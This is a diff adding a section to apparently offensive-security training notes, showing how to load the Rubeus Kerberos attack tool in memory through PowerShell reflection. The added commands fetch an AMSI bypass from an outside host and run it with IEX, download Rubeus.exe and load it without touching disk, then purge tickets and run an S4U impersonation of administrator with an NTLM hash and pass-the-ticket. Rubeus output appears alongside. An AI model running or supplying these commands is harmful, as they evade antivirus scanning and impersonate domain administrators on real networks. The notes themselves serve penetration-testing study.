@@ -57,3 +57,31 @@ PS C:\> $method = $class.GetMethod("runner")
 
 PS C:\> $method.Invoke(0, $null)
 ```
+
+**EXAMPLE: Invoke Rubeus through refleciton:**
+
+(We can do it because the Main method is public and we can call all the functions by specifying their names):
+
+PowerShell commands:
+
+```
+PS C:\> (New-Object System.Net.WebClient).DownloadString('http://192.168.1.1/amsi.txt') | IEX  -> first bypass AMSI, amsi bypass used [here](https://github.com/trike33/PEN-300-Code-Snippets/blob/main/AMSI%20Bypasses/PowerShell/AmsiContext.ps1)
+
+PS C:\> $data = (New-Object System.Net.WebClient).DownloadData('http://192.168.1.1/Rubeus.exe')
+
+PS C:\> $assem = [System.Reflection.Assembly]::Load($data)
+
+PS C:\> [Rubeus.Program]::Main("purge".Split())
+[Rubeus.Program]::Main("purge".Split())
+______ _
+(_____ \ | |
+_____) )_ _| |__ _____ _ _ ___
+| __ /| | | | _ \| ___ | | | |/___)
+| | \ \| |_| | |_) ) ____| |_| |___ |
+|_| |_|____/|____/|_____)____/(___/
+v1.5.0
+[*] Action: Purge Tickets
+Luid: 0x0
+[+] Tickets successfully purged!
+
+PS C:\> [Rubeus.Program]::Main("s4u /user:web01$ /rc4:<ntlm_hash> /impersonateuser:administrator /msdsspn:<spn> /ptt".Split())  -> Example of calling Rubeus with arguments thourgh reflection
